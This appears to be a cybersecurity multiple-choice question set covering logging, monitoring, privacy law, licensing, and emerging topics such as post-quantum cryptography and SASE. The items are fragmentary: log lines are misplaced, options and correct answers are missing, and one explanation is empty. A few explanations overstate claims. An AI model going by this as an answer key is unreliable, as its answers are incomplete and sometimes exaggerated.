options.text: To verify that the organization's security controls meet specific regulatory requirements (like HIPAA or PCI-DSS).

explanation:
/var/log/auth.log
May 20 10:00:01 server sshd[1234]: Failed password for root from 192.16
May 20 10:00:05 server sshd[1234]: Failed password for root from 192.16
Compliance audits are legal or contractual requirements. An auditor checks if you are "doing
what you said you would do" to protect sensitive data.
subject: Cyber Security

question: (Scenario-Based) An attacker manages to compromise a server and immediately deletes the history files and system logs. Which security control would have prevented the loss of this audit trail?

options.label: C
options.text: Centralized Log Management (sending logs to a separate, write-only server).

explanation:
If logs are sent to a remote Log Server (like Splunk or an ELK stack) in real-time, the attacker
can delete the local copies, but the security team will still have the record of what happened
on the remote server.
subject: Cyber Security

question: (Conceptual) In security monitoring, what is a "True Negative"?

options.label: A
options.text: A system failure that is not recorded.

options.label: B
options.text: When the monitoring system correctly identifies a legitimate action as safe and does not trigger an alert.

options.label: C
options.text: An attacker who is not caught.

explanation:
True Negative is the "ideal" state for normal traffic. It means the system is working correctly by
staying silent when there is no threat.
subject: Cyber Security

question: (Conceptual) What is the function of NetFlow data in network monitoring?

options.label: A
options.text: To read the contents of users' emails.

options.label: B
options.text: To record metadata about network traffic (source, destination, ports, amount of data) without capturing the full packet payload.

explanation:
NetFlow is like a "phone bill" for the network. It doesn't tell you what was said (payload), but it
tells you who called whom, when, and for how long. It is vital for detecting large-scale data
exfiltration.
subject: Cyber Security

question: (Scenario-Based) A user in the European Union requests that a social media company delete all their photos, posts, and personal profile data because they no longer wish to use the service. Under GDPR, which principle is the user exercising?

options.label: C
options.text: Right to Erasure (Right to be Forgotten)

explanation:
The Right to Erasure allows individuals to request the deletion of their personal data when
there is no compelling reason for its continued processing by the company.
subject: Cyber Security

question: (Conceptual) Which form of Intellectual Property is most commonly used to protect the actual source code of a software application from being copied by a competitor?
explanation:
Source code is treated as a "literary work" under international law. Therefore, it is
automatically protected by Copyright the moment it is written, preventing others from legally
copying the text of the code.
subject: Cyber Security

question: (Scenario-Based) A security researcher finds a critical vulnerability in a large bank's website. Instead of selling it on the dark web, they document it and send a private report to the bank's security team, giving them 90 days to fix it. This is known as:
explanation:
Responsible disclosure is an ethical practice where researchers work with vendors to fix bugs
before making them public, preventing attackers from exploiting the flaw in the meantime.
subject: Cyber Security

question: (Conceptual) What is the main legal issue addressed by the Computer Fraud and Abuse Act (CFAA)?

options.label: B
options.text: Accessing a computer or network "without authorization" or "exceeding authorized access."

options.label: C
options.text: The speed of the internet connection.

explanation:
The CFAA is the primary anti-hacking law. It criminalizes the act of breaking into systems,
regardless of whether data was stolen or damage was done.
subject: Cyber Security

question: (Comparison) What is the difference between Proprietary and GPL (General Public License) software?

options.label: A
options.text: GPL software is always free of cost.

options.label: B
options.text: Proprietary software restricts the user's right to view or modify the source code; GPL requires that any modifications also be released under the same open-source terms.

options.label: C
options.text: Proprietary software is only for Windows.

explanation:
The GPL is a "copyleft" license. It ensures that software remains free and open, requiring
anyone who distributes a modified version to share their code as well. Proprietary code is kept
secret as a trade secret.
subject: Cyber Security

question: (Conceptual) The GDPR principle of "Data Minimization" requires that organizations:

options.label: A
options.text: Compress all their data using ZIP files.

options.label: B
options.text: Only collect and process personal data that is strictly necessary for the specified purpose.

options.label: D
options.text: Store data on the smallest possible hard drives.

explanation:
Data minimization reduces risk. If you don't need a user's date of birth to provide a service,
you shouldn't ask for it. This limits the damage if a breach occurs.
subject: Cyber Security

question: (Scenario-Based) A professional "Ethical Hacker" is hired to test a company's defenses. Before starting, they sign a document defining exactly which IP addresses can be attacked and what methods are allowed. This document is called:
explanation:
The RoE is a critical legal and ethical document. It prevents the hacker from accidentally
attacking a client's partner or using a method that could crash a production server.
subject: Cyber Security

question: (Conceptual) What is the purpose of the DMCA (Digital Millennium Copyright Act) anti-circumvention provisions?

options.label: A
options.text: To encourage users to share passwords.

options.label: B
options.text: To make it illegal to create or use tools that bypass digital rights management (DRM) protections on copyrighted works.

options.label: C
options.text: To allow users to download movies for free.

options.label: D
options.text: To protect the privacy of email headers.

explanation:
The DMCA prohibits the "circumvention" of technical measures (like encryption or license
keys) that control access to copyrighted material like games, movies, and software.
subject: Cyber Security

question: (Conceptual) Why is Quantum Computing considered a major emerging threat to current cybersecurity standards?

options.label: A
options.text: Quantum computers are much faster at guessing passwords using simple brute force.

options.label: B
options.text: Algorithms like Shor’s Algorithm running on a quantum computer can solve the mathematical problems behind RSA and ECC in polynomial time, rendering them obsolete.

options.label: C
options.text: Quantum computers can physically melt traditional hard drives.

options.label: D
options.text: Quantum computers do not use IP addresses, making them untraceable.

explanation:
Most modern encryption (RSA/Diffie-Hellman) relies on the difficulty of integer factorization or
discrete logarithms. A large-scale quantum computer can solve these problems almost
instantly, breaking the foundation of internet security.
subject: Cyber Security

question: (Scenario-Based) An attacker uses a generative AI model to create a "Deepfake" audio recording of a CEO's voice, tricking an employee into transferring funds. This is a modern evolution of which classic attack?
explanation:
Deepfakes use AI to enhance social engineering. By mimicking a trusted voice or face
perfectly, attackers can bypass traditional human "gut feeling" checks that used to catch
scammers.
subject: Cyber Security

question: (Conceptual) In a Zero Trust Architecture, what is Micro-segmentation?

options.label: A
options.text: Dividing a hard drive into very small partitions.

options.label: B
options.text: Dividing the network into granular zones to control lateral movement, where access between two internal servers requires explicit authorization.

options.label: C
options.text: Reducing the size of the network packets.

options.label: D
options.text: Allowing only one user to log in at a time.

explanation:
Traditional security was like a castle with a moat (one big perimeter). Micro-segmentation is
like having a lock on every single door inside the castle, ensuring that if an attacker enters one
room, they are still blocked from the rest.
subject: Cyber Security

question: (Comparison) What is the primary benefit of Post-Quantum Cryptography (PQC) over traditional RSA encryption?

options.label: A
options.text: PQC is faster on traditional CPUs.

options.label: C
options.text: PQC is based on mathematical problems (like shortest vector problems in lattices) that are believed to be resistant to both classical and quantum computer attacks.

options.label: D
options.text: PQC does not require electricity to run.

explanation:
PQC aims to replace current standards with algorithms that even a quantum computer cannot
solve efficiently, ensuring long-term data confidentiality.
subject: Cyber Security

question: (Code/Logic) A security team is deploying an AI-based Anomaly Detection system. Based on the following log, why did the AI trigger an alert despite a valid login?

options.label: C
options.text: Behavioral Analysis: The unusual time and massive data transfer deviated significantly from the established user baseline.

options.label: D
options.text: The admin was using a mobile device.

explanation:
Modern AI security doesn't just look at "right or wrong" credentials. It looks at behavior. An
admin logging in at 3 AM and downloading 50GB of data is a high-probability indicator of a
compromised account or insider threat.
subject: Cyber Security

question: (Conceptual) How can Blockchain technology be used to improve cybersecurity in supply chain management?

options.label: A
options.text: By making the data transfer faster.

options.label: B
options.text: By providing an immutable, transparent record of every hardware and software component, preventing the injection of counterfeit or malicious parts.

options.label: C
options.text: By replacing the need for firewalls.

explanation:
Blockchain's immutability ensures that once a record is entered, it cannot be secretly altered.
This provides a "chain of trust" for software updates and hardware components.
subject: Cyber Security

question: (Scenario-Based) An organization adopts SASE (Secure Access Service Edge). What does this emerging trend combine?

options.label: A
options.text: Hardware routers and physical security guards.

options.label: B
options.text: WAN capabilities (networking) with cloud-native security functions (like firewalls and CASB) into a single service model.

explanation:

question: (Conceptual) What is Homomorphic Encryption?

options.label: A
options.text: Encryption that uses the same key for everyone.

options.label: B
options.text: A type of encryption that allows mathematical computations to be performed on ciphertext, producing an encrypted result that, when decrypted, matches the result of the operations on the plaintext.

options.label: D
options.text: A method for encrypting only human DNA data.

explanation:
This is a "holy grail" of privacy. It allows a cloud provider to process your data (e.g., calculate
your taxes) without the provider ever actually "seeing" your private numbers.
subject: Cyber Security
